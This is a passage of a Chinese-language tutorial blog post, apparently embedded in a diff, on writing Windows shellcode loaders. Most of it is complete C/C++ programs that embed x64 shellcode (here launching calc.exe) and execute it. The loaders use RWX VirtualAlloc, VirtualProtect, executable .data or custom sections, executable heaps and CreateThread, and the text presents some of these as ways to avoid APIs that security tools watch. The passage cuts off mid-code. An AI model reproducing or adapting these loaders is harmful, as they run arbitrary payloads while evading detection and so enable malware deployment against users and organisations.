x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    <span class="comment">// 分配可读可写不可执行的内存</span></span><br><span class="line">    LPVOID pMemory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (pMemory != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="comment">// 将shellcode复制到分配的内存中</span></span><br><span class="line">        std::<span class="built_in">memcpy</span>(pMemory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">        <span class="comment">// 修改内存属性为可执行</span></span><br><span class="line">        DWORD oldProtect;</span><br><span class="line">        <span class="built_in">VirtualProtect</span>(pMemory, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class="line">        ((<span class="built_in">void</span>(*)())pMemory)();</span><br><span class="line">        <span class="comment">// 释放内存</span></span><br><span class="line">        <span class="built_in">VirtualFree</span>(pMemory, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="释放内存"><a href="#释放内存" class="headerlink" title="释放内存"></a>释放内存</h3><blockquote>
+<p><code>VirtualFree</code>是⼀个<code>WinAPI</code>,用于释放之前分配的内存.该函数应仅在有效载荷完全执行完成后调用,否则可能会释放有效载荷的内容并使进程崩溃.</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">VirtualFree</span><span class="params">(</span></span><br><span class="line"><span class="params"> [in] LPVOID lpAddress,</span></span><br><span class="line"><span class="params"> [in] SIZE_T dwSize,</span></span><br><span class="line"><span class="params"> [in] DWORD dwFreeType</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>VirtualFree采用要释放的分配内存的基地址(lpAddress)、要释放的内存大小(dwSize)和释放操作的类型(dwFreeType可以是以下标志之⼀)：</p>
+<ul>
+<li><p><code>MEM_DECOMMIT</code>  该<code>VirtualFree</code>调用将释放物理内存,而不会释放与其链接的虚拟地址空间. 因此,虚拟地址空间将来仍可用于分配内存,但与其链接的页面不再受物理内存支持.</p>
+</li>
+<li><p><code>MEM_RELEASE</code> 虚拟地址空间和与分配的虚拟内存关联的物理内存均被释放.请注意,根据 Microsoft 的文档,使用此标志时,参数dwSize必须为 0</p>
+</li>
+</ul>
+<h2 id="注入执行"><a href="#注入执行" class="headerlink" title="注入执行"></a>注入执行</h2><h3 id="指针执行"><a href="#指针执行" class="headerlink" title="指针执行"></a>指针执行</h3><h4 id="申请内存"><a href="#申请内存" class="headerlink" title="申请内存"></a>申请内存</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    <span class="comment">// 分配内存</span></span><br><span class="line">    LPVOID Memory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (Memory == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将shellcode拷贝进内存</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">// 执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())Memory)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>(void(*)())</code>是一个函数指针类型的强制转换, 该函数指针指向一个没有参数且返回值类型为<code>void</code>的函数,也就是说这行代码将<code>Memory</code>的地址转换为一个函数指针,然后调用该指针所指向的函数</p>
+<h4 id="修改内存属性"><a href="#修改内存属性" class="headerlink" title="修改内存属性"></a>修改内存属性</h4><p>既然<code>buf</code>都已经在内存当中了,为什么我们还需要使用<code>VirtualAlloc()</code>去申请内存呢?直接删掉<code>VirtualAlloc()</code>后执行.发现运行后无反应.这是因为字符串在内存中只有可读的权限并没有可执行的权限,所以我们可以修改内存属性.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 修改数据内存属性为可执行</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>(buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="comment">// 执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())&amp;buf)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="修改data段属性"><a href="#修改data段属性" class="headerlink" title="修改data段属性"></a>修改data段属性</h4><blockquote>
+<p>修改内存属性不但可以使用<code>VirtualProtect</code> api函数, 还可以在程序编译的时候修改内存段的属性.</p>
+<p>这样可以规避使用<code>VirtualProtect</code>这个敏感api函数操作了.</p>
+<p>默认全局变量是存放在data段, 修改成可执行即可</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)<span class="comment">//设置 data段可读可写可执行</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ((<span class="built_in">void</span>(*)())&amp;buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="新增数据段"><a href="#新增数据段" class="headerlink" title="新增数据段"></a>新增数据段</h4><p>除了修改data段的内存属性, 还可以新增一个段, 设置为可执行的属性</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">// 这是一个编译器指令,用于告诉编译器将接下来的数据放置在名为&quot;vdata&quot;的特殊数据段中.这个数据段是一个自定义命名的段,用于存储一些特殊的数据.</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;vdata&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"><span class="comment">//这个指令告诉编译器停止将数据放置在之前定义的特殊数据段中,即&quot;vdata&quot;.</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="comment">//这是一个链接器指令,告诉链接器将&quot;vdata&quot;段标记为可读(Read)、可写(Write)、可执行(Execute).这是为了确保在运行时可以修改这个段的内容,通常用于实现一些动态代码生成或者代码注入的技术</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/SECTION:vdata,RWE&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ((<span class="built_in">void</span>(*)())&amp;buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="通过堆加载"><a href="#通过堆加载" class="headerlink" title="通过堆加载"></a>通过堆加载</h4><blockquote>
+<p>除了通过链接器修改数据段的内存属性外, 还可以通过<code>HeapCreate</code>api获取一个具有执行权限的堆, 并在其中分配一块内存,将其地址赋给<code>shellcode</code>, 也是一种规避<code>VirtualAlloc</code>,<code>VirtualProtect</code>api的一种实现方法, 通过指针运行.</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    <span class="comment">// 创建一个具有执行权限的堆,以存储shellcode</span></span><br><span class="line">    HANDLE HeapHandle = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="built_in">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 在创建的堆中分配一块内存,并将其地址赋给buffer</span></span><br><span class="line">    <span class="type">char</span>* buffer = (<span class="type">char</span>*)<span class="built_in">HeapAlloc</span>(HeapHandle, HEAP_ZERO_MEMORY, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">// 将shellcode复制到buffer指向的内存中</span></span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">// 将buffer指向的内存地址强制转换为一个函数指针,并调用该函数,执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())buffer)();</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>
+
+<h3 id="创建线程执行-CreateThread"><a href="#创建线程执行-CreateThread" class="headerlink" title="创建线程执行-CreateThread"></a>创建线程执行-CreateThread</h3><p><code>CreateThread</code>函数是Windows操作系统提供的一个函数,用于在当前进程中创建一个新的线程.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">	HANDLE hHep = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	PVOID Mptr = <span class="built_in">HeapAlloc</span>(hHep, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">	<span class="built_in">RtlCopyMemory</span>(Mptr, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">	DWORD dwThreadId = <span class="number">0</span>;</span><br><span class="line">	HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)Mptr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwThreadId);</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">	<span class="comment">// 分配内存</span></span><br><span class="line">	LPVOID Memory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (Memory == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memcpy</span>(Memory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">	DWORD dwThreadId = <span class="number">0</span>;</span><br><span class="line">	HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)Memory, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwThreadId);</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">	<span class="comment">// 关闭线程</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分离加载"><a href="#分离加载" class="headerlink" title="分离加载"></a>分离加载</h2><h3 id="本地分离"><a href="#本地分离" class="headerlink" title="本地分离"></a>本地分离</h3><p>直接在加载器中通过读取文件 ( 二进制文件raw ) 内容的形式获取shellcode, 然后加载运行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 